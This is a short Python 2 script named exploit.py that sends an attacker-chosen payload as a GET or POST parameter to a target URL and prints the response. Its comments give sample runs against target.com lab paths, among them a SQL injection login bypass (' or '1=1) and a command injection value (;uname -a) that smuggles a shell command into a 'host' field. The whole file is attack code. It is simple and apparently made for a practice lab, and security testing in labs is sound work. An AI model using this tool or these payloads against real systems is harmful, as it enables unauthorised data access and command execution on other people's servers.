import sys
import requests

inputUrl = sys.argv[1]
inputMethod = sys.argv[2]
inputName = sys.argv[3]
inputPayload = sys.argv[4]

#print sys.argv
#inputUrl = "http://target.com/sqli/sqli.php"
#inputName = "username"
#inputPayload = "\' or \'1=1"

if inputMethod == 'get' :
    print "init get request"
    request = requests.get(inputUrl, params = {inputName : inputPayload})
else :  
    print "init post request"
    request = requests.post(inputUrl, data = {inputName : inputPayload})

print request.content


#note add \ to ;. e.g ";uname -a"  in python script run as "\;uname -a"
#sample 		python exploit.py http://target.com/commandinjection/commandinjection.php post host ";uname -a"
#sample post run:	python exploit.py http://target.com/sqli/sqli.php post username "' or '1=1"
#sample get run:	python exploit.py http://target.com/serverside/serverside.php get page "oranges"
  
